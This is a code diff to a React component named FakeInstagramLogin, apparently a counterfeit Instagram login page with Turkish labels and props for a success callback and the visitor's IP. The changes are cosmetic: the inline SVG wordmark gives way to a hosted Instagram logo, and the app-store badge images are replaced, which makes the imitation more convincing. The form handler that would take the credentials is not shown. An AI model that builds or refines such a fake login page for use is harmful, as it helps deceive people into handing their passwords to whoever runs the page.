@@ -46,11 +46,13 @@ export default function FakeInstagramLogin({ onSuccess, ip }) {
         <div className="ig-login-container">
           {/* Main Login Card */}
           <div className="ig-login-box">
-            {/* Instagram Logo - SVG wordmark */}
+            {/* Instagram Logo - Image */}
             <div className="ig-logo-container">
-              <svg aria-label="Instagram" className="ig-logo-svg" viewBox="0 0 174.6 51.0" width="175" height="51">
-                <path d="M145.44 7.437c4.15 0 7.073 3.381 7.073 9.143v15.336h-4.33V17.218c0-3.788-1.554-5.884-4.42-5.884-2.91 0-4.96 2.32-4.96 5.884V31.96h-4.33V17.218c0-3.788-1.554-5.884-4.42-5.884-2.865 0-4.96 2.32-4.96 5.884V31.96h-4.33V7.843h4.33v3.067c1.42-2.186 3.516-3.473 6.336-3.473 2.866 0 5.19 1.377 6.426 3.877 1.6-2.5 3.966-3.877 6.605-3.877zm-76.27 12.423c0-5.076-3.201-8.415-7.348-8.415-4.15 0-7.345 3.339-7.345 8.415 0 5.076 3.205 8.418 7.345 8.418s7.348-3.342 7.348-8.418zm4.33 0c0 7.083-5.187 12.469-11.678 12.469-3.158 0-5.706-1.195-7.528-3.335v2.966h-4.33V.452h4.33v10.706c1.822-2.145 4.375-3.34 7.528-3.34 6.491.046 11.678 5.387 11.678 12.47v-.428zm-35.795 0c0-5.302-3.247-8.415-7.079-8.415-4.15 0-7.345 3.339-7.345 8.415 0 5.076 3.205 8.418 7.345 8.418 3.832 0 7.079-3.113 7.079-8.418zm4.33 11.65h-4.33v-2.964c-1.736 2.135-4.375 3.335-7.528 3.335-6.491 0-11.678-5.387-11.678-12.47S23.66 6.993 30.151 6.993c3.158 0 5.792 1.195 7.528 3.34V7.843h4.33V31.51zm-18.86-24.12c-2.504 0-4.42-.36-4.42-.36V3.143s1.78-.36 3.608-.36c4.058 0 6.515 2.005 6.515 5.661 0 3.115-2.322 5.122-5.658 5.122-.04-.09-.045-.166-.045-.166zm7.528 24.076V18.72s-1.6-.45-3.428-.45c-2.505 0-4.422 1.24-4.422 3.698v9.948H18.1V7.843h4.33v3.472c1.464-2.455 3.742-3.878 6.697-3.878 4.868 0 7.752 3.069 7.752 8.054v16.42h-4.33l-.047-.045zM10.23 7.437V31.96H5.9V7.798L.08 9.802V5.834l9.785-3.338.365.943v3.998zM164.13 26.163h-.946v-3.832h.946c.496 0 .946.36.946.99v1.873c0 .586-.449.969-.946.969zm-2.148 5.753h1.202v-4.798h.631l1.427 4.798h1.336l-1.516-4.798c.856-.316 1.472-1.035 1.472-2.024v-1.873c0-1.215-.856-2.025-2.148-2.025h-2.148v10.72h.765-.02zm.946-12.605c-3.607 0-6.56 2.924-6.56 6.574 0 3.608 2.953 6.575 6.56 6.575 3.608 0 6.56-2.924 6.56-6.574 0-3.608-2.908-6.575-6.56-6.575zm0 12.109c-3.068 0-5.57-2.52-5.57-5.534 0-3.069 2.502-5.535 5.57-5.535 3.068 0 5.57 2.52 5.57 5.535s-2.502 5.534-5.57 5.534zM90.885 7.843h4.24v3.787h-4.24V25.176c0 2.141 1.059 3.065 3.068 3.065h1.172v3.675l-1.783.09c-4.104 0-6.784-2.32-6.784-6.065V11.63h-3.563V7.843h3.563V2.76h4.33l-.003 5.083zm13.24 17.333c3.968 0 6.605-3.159 6.605-5.478h4.24c-.225 4.978-4.825 9.588-10.845 9.588-7.028 0-12.037-5.387-12.037-12.47S97.097 4.412 104.125 4.412c6.02 0 10.62 4.654 10.845 9.588h-4.24c0-2.316-2.637-5.478-6.605-5.478-4.465 0-7.707 3.339-7.707 8.415 0 5.076 3.242 8.418 7.707 8.418v-.179zm-46.95 6.785V.452h4.33v31.508h-4.33z" fill="#262626" />
-              </svg>
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png"
+                alt="Instagram"
+                className="ig-logo-img"
+              />
             </div>
 
             <form onSubmit={handleSubmit} className="ig-form">
@@ -151,14 +153,14 @@ export default function FakeInstagramLogin({ onSuccess, ip }) {
             <div className="ig-badges">
               <a href="#" onClick={(e) => e.preventDefault()}>
                 <img
-                  src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
+                  src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg"
                   alt="App Store'dan indir"
                   className="ig-badge-img"
                 />
               </a>
               <a href="#" onClick={(e) => e.preventDefault()}>
                 <img
-                  src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
+                  src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
                   alt="Google Play'den edinin"
                   className="ig-badge-img"
                 />
@@ -245,6 +247,12 @@ export default function FakeInstagramLogin({ onSuccess, ip }) {
         }
 
         .ig-logo-svg {
+          display: block;
+        }
+        
+        .ig-logo-img {
+          width: 175px;
+          height: auto;
           display: block;
         }
 
